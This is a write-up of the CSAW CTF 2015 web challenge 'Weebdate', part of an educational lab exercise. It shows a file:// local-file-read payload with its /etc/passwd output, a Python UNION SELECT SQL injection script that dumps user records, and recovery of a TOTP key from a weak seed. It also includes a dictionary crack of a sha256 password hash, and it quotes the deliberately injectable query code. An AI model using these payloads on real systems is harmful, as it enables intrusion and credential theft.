# CSAW CTF 2015: Weebdate

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| CSAW CTF 2015 | Weebdate | Web |    500 |

**Description:**
>*Since the Ashley Madison hack, a lot of high profile socialites have scrambled to find the hottest new dating sites. Unfortunately for us, that means they're taking more safety measures and only using secure websites. We have some suspicions that Donald Trump is using a new dating site called "weebdate" and also selling cocaine to fund his presidential campaign. We need you to get both his password and his 2 factor TOTP key so we can break into his profile and investigate.
>Flag is md5($totpkey.$password)*
>
>http://54.210.118.179/
----------
## Write-up
### First look

By visiting http://54.210.118.179/ we are presented with the Weebdate homepage. 
At first glance we see a 'sign up' and a 'login' page at: 

>http://54.210.118.179/login

and 

>http://54.210.118.179/register

### Registering a user and logging in
Let's first try to register a user:

> USERNAME: gooby
>
> PASSWORD: 1

After registration we are given a 'TOTP Key' and a QR code. The TOTP Key being 'QDQQFZ6AUZQ2YR6N' for the user gooby. 
Turns out the QR code is simply an encoded otpauth:// url with our username and secret inside.
Incidentally (or not) the username is printed out unsanitised giving us a red herring XSS. 

The nest step is to obviously try to login to Weebdate, when we look at the login page we see that we not only need our username and password, but also a "totp verification code"
This totp token is an OtpAuth-token, which is based on an initial shared secret which is combined with the current time to generate tokens that are only valid for a certain period 
of time. So for this to work we need to sync our clock with the clock of the server. The server-timestamp is found in every HTTP response.
 
We need to take the initial 'TOTP Key' (which is our base32-encoded TOTP 'seed') and [generate a valid totp-code](solution/otp.py). 

>```python
>#!/usr/bin/env python
>
>from otpauth import OtpAuth
>import time, base64
>
>secret = "QDQQFZ6AUZQ2YR6N" # key for gooby:1
>auth = OtpAuth(base64.b32decode(secret))
>print "[+]User: gooby, password:1"
>print "[+]TOTP token: [%d]" % auth.totp()
>print "[+]%s " % time.strftime("%c")
>```
Which will output something like

>```bash
>[+]User: gooby, password:1
>[+]TOTP token: [693461]
>[+]Sun Sep 20 20:03:21 2015 
>```

We can now finally login to the application! :D

### Disclosing local file contents
After login, we have the ability to:

- edit our profile via /profile/edit
- search for other users on the weebdate site via /search
- view and send messages via /messages

Now, on the /profile/edit page, theres an option to specify a URL as profile image. The server-side code will fetch the contents of the URL and if it is a valid image, it will display it as a profile image.
When the content returned is not a valid image however, the content is fully disclosed to the guest in an error message. 
Apparently, this server-side code was written in python and the URL is fetched with urlopen.urlopen. We can see this by feeding the application a non-existing or plain invalid URL

> http://ayylmao

If we input the above URL, the server responds with
>```
>[...]
>Malformed url ParseResult(scheme=u'http', netloc=u'ayylmao', path=u'', params='', query='', fragment='')
>[...]
>```


The good news here is that urlopen also supports other protocol handlers other than http:// or https://, file:// comes to mind for example

Lets say we want the content of /etc/passwd, we could try 

> file:///etc/passwd

But this gives the following output again

>```
>[...]
>Malformed url ParseResult(scheme=u'file', netloc=u'', path=u'/etc/passwd', params='', query='', fragment='')
>[...]
>```

We can see that the url we give to the application is parsed and netloc is empty, maybe it expects at least a netloc?

> file://localhost/etc/passwd

>```bash
>Unknown file type: root:x:0:0:root:/root:/bin/bash
>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
>bin:x:2:2:bin:/bin:/usr/sbin/nologin
>sys:x:3:3:sys:/dev:/usr/sbin/nologin
>sync:x:4:65534:sync:/bin:/bin/sync
>games:x:5:60:games:/usr/games:/usr/sbin/nologin
>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
>libuuid:x:100:101::/var/lib/libuuid:
>syslog:x:101:104::/home/syslog:/bin/false
>messagebus:x:102:106::/var/run/dbus:/bin/false
>landscape:x:103:109::/var/lib/landscape:/bin/false
>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
>pollinate:x:105:1::/var/cache/pollinate:/bin/false
>ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
>mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
>```

Bingo!

Now we can proceed to disclose the source code of the actual application:
>```
>file://localhost/var/www/weeb/server.py
>file://localhost/var/www/weeb/settings.py
>file://localhost/var/www/weeb/utils.py
>```
### Hello, SQLi, my old friend. I've come to talk with you again

Upon reading the application source code (in particular [server.py](challenge/server.py) and [settings.py](challenge/settings.py)) we learn some new things: 

- The TOTP code is based on the first four characters of the username and the first octet of the ip-address of the user. 
- Theres an sql injection vulnerability in /csp/view (function get_csp_report(report_id))

>```python
>def get_csp_report(report_id):
>    cursor = mysql.connection.cursor()
>    cursor.execute(
>        "select * from reports where report_id = %s"% # uh-oh >:)
>        (report_id,)
>    )
>
>    return FetchOneAssoc(cursor)
>```
- The stored hash in the database is in the form sha256(username+password)

To make the sql injecting a little easier, i [wrote a python script](solution/sqli.py):

>```python
>
>import requests
>
>for i in range(0,5):
>	payload = "union all select concat(user_id,0x3a3a3a,user_name,0x3a3a3a,user_password,0x3a3a3a,user_ip,0x3a3a3a,user_image,0x3a3a3a,user_credits,0x3a3a3a,user_register_time),2,3 from users limit %d,1" % i
>	url = "http://54.210.118.179/csp/view/1 %s--" % payload
>	r = requests.get(url)
>	print r.text
>```

This will output

>```bash
>[...]
>{'report_ip': u'2', 'report_content': u'3', 'report_id': u'5:::donaldtrump:::22e59a7a2792b25684a43d5f5229b2b5caf7abf8fa9f186249f35cae53387fa3:::64.124.192.210:::http://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/8e/8e559bd085bbddbf2f0a961ab23f2b989ccdd24e_full.jpg:::0:::0'}
>[...]
>```

Giving us the password-hash and ip-address of donaldtrump.

### Wrapping it up

By salvaging the methods generate_seed() and get_totp_key() from [utils.py](challenge/utils.py), we can generate the TOTP key from the ip-address and username.

The last thing we need is the password and by using one of the most simple john-the-ripper dictionaries we bruteforce the password.
When we have the password we can [generate the flag](solution/final.py) in the form md5($totp_key + $password)

>```python
>#!/usr/bin/env python
>import hashlib, pyotp,random, itertools, socket, struct, string
>
>#{'report_ip': u'2', 'report_content': u'3', 'report_id': u'5:::donaldtrump:::22e59a7a2792b25684a43d5f5229b2b5caf7abf8fa9f186249f35cae53387fa3:::64.124.192.210:::http://i.imgur.com/6ebAqqF.png:::0:::0'}
># We need to know the totp key, for that we need the seed:
>
>def generate_seed(username, ip_address):
>    return int(struct.unpack('I', socket.inet_aton(ip_address))[0]) + struct.unpack('I', username[:4].ljust(4,'0'))[0]
>
>def get_totp_key(seed):
>    random.seed(seed)
>    return pyotp.random_base32(16, random)
>
>username = "donaldtrump"
>ip_address="64.124.192.210"
>
># generate totp_key
>seed = generate_seed(username, ip_address)
>totp_key = get_totp_key(seed)
>
>print "[+]Recovered totp_key: [%s] " % totp_key
>
># and we need to find the password, which is:
>secret_hash = "22e59a7a2792b25684a43d5f5229b2b5caf7abf8fa9f186249f35cae53387fa3"
>file = "john.txt"
>f = open(file, "r")
>final_password = ""
>for password in f:
>	password = password.strip()
>	candidate = hashlib.sha256(username+password).hexdigest()
>	if candidate == secret_hash:
>		print "[+]Cracked password [ %s ] " % password
>		final_password = password
>		break
>
>flag = hashlib.md5(totp_key+final_password).hexdigest()
>print "[+]Flag: [%s]" % flag
>```


Which will output

>```bash
>[+]Recovered totp_key: [6OIMTPLHSQ6JUKYP] 
>[+]Cracked password [ zebra ] 
>[+]Flag: [a8815ecd3c2b6d8e2e884e5eb6916900]
>```
